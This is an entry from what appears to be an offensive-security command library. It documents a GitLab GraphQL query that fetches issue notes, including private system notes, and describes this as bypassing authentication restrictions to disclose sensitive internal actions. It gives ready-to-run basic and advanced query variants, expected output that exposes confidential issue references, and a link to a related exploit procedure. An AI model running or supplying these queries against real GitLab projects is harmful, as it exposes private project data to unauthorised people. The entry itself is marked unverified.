---
data: >-
  query { project(fullPath:"username16/ci-test"){ issue(iid:"1"){
  descriptionHtml notes{ edges{ node{ bodyHtml system author{ username } body }
  } } } } }
tags:
  - graphql
  - information-disclosure
type: command
output: >-
  JSON response with notes including private system notes, e.g., { "data": {
  "project": { "issue": { "notes": { "edges": [ { "node": { "system": true,
  "body": "moved to dynamic #1", "author": { "username": "user" } } } ] } } } }
executor: graphql
platforms:
  - Web
  - GitLab
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:53.256Z'
id: 23bde129-4a28-4815-965d-eb0f20a31852
verified: false
validated: true
submitted: true
---
# gitlab-graphql-fetch-issue-notes

## Command

```graphql
query { project(fullPath:"username16/ci-test"){ issue(iid:"1"){ descriptionHtml notes{ edges{ node{ bodyHtml system author{ username } body } } } } } }
```

## Description

This GraphQL query fetches details of a specific issue in a GitLab project, including all associated notes (public and private system notes), bypassing authentication restrictions to disclose sensitive internal actions.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| fullPath | Project path (e.g., "username16/ci-test") | Yes |
| iid | Issue internal ID (e.g., "1") | Yes |
| notes.edges.node.bodyHtml | HTML body of the note | No |
| notes.edges.node.system | Flag indicating system note (true for private actions) | No |
| notes.edges.node.author.username | Author username | No |
| notes.edges.node.body | Plain text body of the note | No |

## Examples

### Basic Usage

```graphql
query { project(fullPath:"username16/ci-test"){ issue(iid:"1"){ notes{ edges{ node{ body system author{ username } } } } } } }
```

### Advanced Usage

```graphql
query { project(fullPath:"example/project"){ issue(iid:"5"){ descriptionHtml notes(first: 50){ edges{ node{ bodyHtml system author{ username name } body updatedAt } } pageInfo{ hasNextPage endCursor } } } } }
```

## Expected Output

A JSON object containing the issue data, with a notes array that includes private system notes (system: true) revealing actions like project moves or confidential references, e.g., body: "marked as duplicate of #2 (confidential issue)".

## Related

- [[Related Procedure: Exploit-GitLab-GraphQL-for-Private-Note-Disclosure]]
